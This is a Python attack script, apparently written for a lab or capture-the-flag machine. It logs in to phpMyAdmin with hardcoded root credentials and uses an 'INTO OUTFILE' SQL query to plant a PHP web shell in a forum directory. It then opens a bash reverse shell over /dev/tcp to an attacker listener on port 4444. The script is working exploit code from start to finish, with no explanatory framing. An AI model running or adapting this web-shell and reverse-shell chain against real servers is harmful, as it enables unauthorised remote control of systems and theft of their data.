import requests
from pwn import *
import re
import sys

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# ======== CONFIGURATION ========
TARGET = "https://192.168.56.4"     
ATTACKER_IP = "192.168.56.5"         
ATTACKER_PORT = 4444
USERNAME = "root"
PASSWORD = "Fg-'kKXBj87E:aJ$"
PHP_SHELL_PATH = "/var/www/forum/templates_c/reverse_shell.php"
SHELL_URL = f"{TARGET}/forum/templates_c/reverse_shell.php"
# ================================

# Start session and login
s = requests.Session()
print("[*] Logging in to phpMyAdmin...")
login_data = {
    'pma_username': USERNAME,
    'pma_password': PASSWORD
}
response = s.post(f"{TARGET}/phpmyadmin/index.php", verify=False, data=login_data)

# Extract token from page
token_pattern = re.compile(r'^src="main.php\?token=(.*?)&amp;')
token = None
for line in response.text.split():
    match = token_pattern.match(line)
    if match:
        token = match.group(1)
        break

if not token:
    print("[-] Could not find phpMyAdmin token.")
    sys.exit(1)

print(f"[+] Token found: {token}")

# SQL payload to create PHP shell
sql_payload = (
    "SELECT 1, '<?php system($_GET[\"cmd\"]); ?>' "
    f"INTO OUTFILE '{PHP_SHELL_PATH}'"
)

print("[*] Sending SQL injection to drop PHP reverse shell...")
inject_data = {
    'is_js_confirmed': 0,
    'token': token,
    'pos': 0,
    'goto': 'server_sql.php',
    'message_to_show': 'Your SQL query has been executed successfully',
    'prev_sql_query': '',
    'sql_query': sql_payload,
    'bkm_label': '',
    'sql_delimiter': ';',
    'show_query': 1,
    'ajax_request': 'true'
}

ret = s.post(f"{TARGET}/phpmyadmin/import.php", data=inject_data)
try:
    result = ret.json()
    if not result.get('success'):
        print("[-] SQL injection failed:", result.get('error'))
        if "already exists" not in result.get('error', ''):
            sys.exit(1)
except Exception as e:
    print("[-] Could not parse response or inject:", str(e))
    sys.exit(1)

# Test shell access
print("[*] Verifying shell is accessible...")
ret = requests.get(SHELL_URL, verify=False)
if not ret.ok:
    print("[-] Shell file was not created or is not accessible.")
    sys.exit(1)

print("[+] Shell uploaded successfully at:", SHELL_URL)

# Start listener
print(f"[*] Starting listener on {ATTACKER_IP}:{ATTACKER_PORT}...")
l = listen(ATTACKER_PORT)
time.sleep(2)

# Send reverse shell command
cmd = (
    f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'"
)
print("[*] Triggering reverse shell...")
requests.get(f"{SHELL_URL}?cmd={cmd}", verify=False)

# Catch shell
l.interactive()
